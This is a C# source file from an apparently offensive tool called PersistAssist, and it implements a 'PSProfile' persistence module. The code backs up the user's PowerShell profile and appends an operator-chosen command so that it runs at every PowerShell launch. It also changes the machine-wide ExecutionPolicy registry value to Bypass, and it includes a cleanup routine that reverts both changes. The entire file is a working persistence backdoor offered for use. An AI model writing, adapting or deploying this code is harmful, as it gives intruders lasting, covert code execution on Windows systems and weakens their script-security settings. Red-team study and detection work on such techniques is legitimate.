using System.IO;

using PersistAssist.Utils;
using PersistAssist.Models;

using static PersistAssist.Models.Data.Enums;

namespace PersistAssist.Functions
{
    class PSProfiles : Persist
    {
        public override string PersistName => "PSProfile";

        public override string PersistDesc => "Backdoors PowerShell profile files";

        public override string PersistUsage => "\n\tPersist: PeristAssist.exe -t PSProfile -p -cmd <command>\n" +
            "\tCleanup: PersistAssist.exe -t PSProfle -c -fp [backup file to revert profile to]";

        public override PersistType PersistCategory => PersistType.Misc;
        public override bool requiresAdmin => true;

        public override string PersistExec(ParsedArgs pArgs)
        {
            if (pArgs.Command.isEmpty()) { throw new PersistAssistException("Incorrect parameters passed. See technique usage"); }

            //check if there is a current profile
            string HOME = $"C:\\Users\\{System.Environment.UserName}\\Documents\\WindowsPowerShell";
            string backupPath = $"{HOME}\\Profile.ps1.bak";
            string profilePath = $"{HOME}\\Profile.ps1";

            if (File.Exists($"{HOME}\\Profile.ps1"))
            {
                System.Console.WriteLine($"[*] Profile exists at $PSHOME, writing current file to {backupPath}");
                //create a backup file
                File.Copy($"{HOME}\\Profile.ps1", $"{backupPath}");
            }
            else { System.Console.WriteLine($"Profile not detected at $PSHOME, creating a profile at {HOME}\\Profile.ps1"); }

            //set execution policy to Bypass
            string prevValue = RegistryOps.ReadKey(@"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell", "ExecutionPolicy",
                RegistryContext.HKLM);

            RegistryOps.ModifyKey(@"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell", "ExecutionPolicy",
                "Bypass", RegistryContext.HKLM);
            // write original PS Profile file to a buffer and append command of our choosing
            File.AppendAllText($"{HOME}\\profile.ps1", pArgs.Command);
            // log paths modified 
            return $"Backdoored {profilePath} to execute {pArgs.Command} when a powershell instance is started\n" +
                $"SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell modified from {prevValue} to Bypass";
        }

        public override string PersistCleanup(ParsedArgs pArgs)
        {
            if (pArgs.regKeyValue.isEmpty()) { throw new PersistAssistException("Incorrect parameters passed. See technique usage"); }
            // taking the file path, remove the profile dropped and replace it with the backup file
            string HOME = $"C:\\Users\\{System.Environment.UserName}\\Documents\\WindowsPowerShell";

            if (File.Exists($"{HOME}\\Profile.ps1.bak"))
            {
                File.Copy($"{HOME}\\Profile.ps1.bak", $"{HOME}\\Profile.ps1");
                File.Delete($"{HOME}\\Profile.ps1.bak");
            }
            else { File.Delete($"{HOME}\\Profile.ps1"); }

            RegistryOps.ModifyKey(@"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell", "ExecutionPolicy",
                pArgs.regKeyValue, RegistryContext.HKLM);

            return "Backdoored PS Profile successfully removed";
        }
    }
}

